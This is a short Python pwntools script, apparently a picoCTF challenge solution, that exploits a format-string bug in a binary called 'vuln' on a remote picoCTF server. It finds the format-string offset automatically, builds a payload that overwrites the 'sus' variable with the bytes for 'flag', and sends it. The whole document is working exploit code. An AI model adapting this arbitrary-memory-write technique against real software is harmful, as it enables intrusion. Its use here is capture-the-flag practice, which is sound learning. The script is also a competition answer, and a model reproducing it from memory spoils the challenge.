import pwn

elf = pwn.context.binary = pwn.ELF("./vuln")

def process():
    return pwn.remote("rhea.picoctf.net", 55494)

# define a function to allow FmtStr to find the offset
def exec_fmt(payload: bytes) -> bytes | None:
    io = process()
    io.sendline(payload)
    return io.recvall()

autofmt = pwn.FmtStr(exec_fmt)
offset = autofmt.offset
print("offset", offset)

# create a payload using the offset
addr = elf.symbols["sus"]
payload = pwn.fmtstr_payload(offset, {addr: 0x67616c66})
print("payload", payload)

# send the payload
io = process()
io.sendline(payload)
print(io.recvall())
